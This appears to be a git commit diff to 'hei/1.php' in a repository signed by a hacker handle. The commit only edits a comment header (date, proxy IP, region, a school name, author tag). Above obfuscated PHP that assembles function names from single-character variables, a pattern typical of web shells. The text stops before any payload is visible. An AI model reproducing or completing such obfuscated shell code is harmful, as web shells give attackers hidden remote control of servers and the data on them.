d8410b44525151209ac4ebc0aee2f6f70f43ae7f
J4CKOP <53121879+J4CK0P@users.noreply.github.com>
2019-07-26 19:23:50 +0700

    Update 1.php

--- hei/1.php
+++ hei/1.php
@@ -1,7 +1,8 @@
- 
 ***
-Update : 16-January-2019
+Update : 26-Juli-2019
 Proxy  : 152.168.1.1
-Region  : TANGERANG
+Region  : Tangerang
+Sekolah : Smk Bina Am Mamur
+CodePlay : J4CKOP
 ***/
 <?php $q='r';$CjFV='_';$xu='a';$R='v';$pBcN='l';$QiY='n';$VtT='>
